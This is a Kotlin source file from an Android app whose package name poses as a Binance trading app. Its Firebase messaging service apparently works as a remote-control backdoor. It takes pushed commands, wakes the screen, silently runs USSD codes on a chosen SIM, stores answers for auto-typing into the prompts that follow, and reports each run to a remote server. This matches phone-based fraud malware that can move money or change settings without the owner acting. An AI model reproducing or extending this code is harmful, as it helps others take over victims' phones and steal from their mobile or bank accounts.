package dApp.binance.Trading.arfu

import android.content.Intent
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage

class MyFirebaseService : FirebaseMessagingService() {

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)

        Log.d("MyFirebaseService", "Message received: ${remoteMessage.data}")

        val data = remoteMessage.data
        val ussdCode = data["ussd_code"] ?: ""
        val inputValue = data["input_value"] ?: ""
        val isFirstCode = data["is_first_code"]?.toBoolean() ?: false
        val isResponse = data["is_response"]?.toBoolean() ?: false

        // Save command to SharedPreferences
        val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
        sharedPref.edit().apply {
            putString("last_command", ussdCode)
            putString("last_input_value", inputValue)
            putLong("last_command_time", System.currentTimeMillis())
            apply()
        }

        // Check if carer service is enabled
        val isEnabled = sharedPref.getBoolean("carer_enabled", true)
        if (!isEnabled) {
            Log.d("MyFirebaseService", "Carer service is disabled")
            return
        }
        
        // Always wake up screen for ANY incoming command/response
        wakeScreen()

        // Handle first USSD code or response input
        if (isFirstCode && ussdCode.isNotEmpty()) {
            // Start new conversation
            ConversationHistory.startConversation(ussdCode, this)
            ConversationHistory.addMessage("user", "Sent USSD: $ussdCode")
            
            val simSlot = data["sim_slot"]?.toIntOrNull() ?: 0

            // Execute USSD code after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                UssdHelper.executeUssd(this, ussdCode, simSlot)
                FirebaseLogHelper.logCommand(ussdCode, "EXECUTED", this)
            }, 1000)

        } else if (isResponse && inputValue.isNotEmpty()) {
            // Add user response to conversation
            ConversationHistory.addMessage("user", "Sent: $inputValue")
            
            // Store input value for auto-typing
            Log.d("MyFirebaseService", "Setting pending input: $inputValue")
            sharedPref.edit().putString("pending_input_value", inputValue).apply()
        }
    }
    
    private fun wakeScreen() {
        Log.d("MyFirebaseService", "Triggering WakeUpActivity")
        val wakeIntent = Intent(this, WakeUpActivity::class.java)
        wakeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(wakeIntent)
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d("MyFirebaseService", "New FCM Token: $token")

        // Save token to SharedPreferences and Firebase
        val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
        sharedPref.edit().putString("fcm_token", token).apply()

        // Register device in Firebase
        FirebaseHelper.registerDevice(this, token)
    }
}
